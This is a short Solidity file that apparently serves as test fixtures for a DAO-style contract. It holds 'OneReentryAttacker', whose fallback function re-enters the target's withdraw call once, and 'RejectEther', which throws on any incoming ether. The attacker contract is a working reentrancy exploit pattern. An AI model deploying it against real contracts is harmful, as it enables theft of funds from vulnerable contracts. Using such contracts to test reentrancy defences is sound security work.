pragma solidity ^0.4.2;

contract DAOInterface {
    function withdraw(uint amount);
}

contract OneReentryAttacker {
    DAOInterface public dao;
    uint public callbacks;

    function OneReentryAttacker(address target) {
        dao = DAOInterface(target);
    }

    function attack() {
        dao.withdraw(1 ether);
    }

    function() payable {
        if (callbacks == 0) {
            callbacks = 1;
            address(dao).call(bytes4(sha3("withdraw(uint256)")), uint(1 ether));
        }
    }
}

contract RejectEther {
    DAOInterface public dao;

    function RejectEther(address target) {
        dao = DAOInterface(target);
    }

    function withdraw() {
        dao.withdraw(1 ether);
    }

    function() payable {
        throw;
    }
}
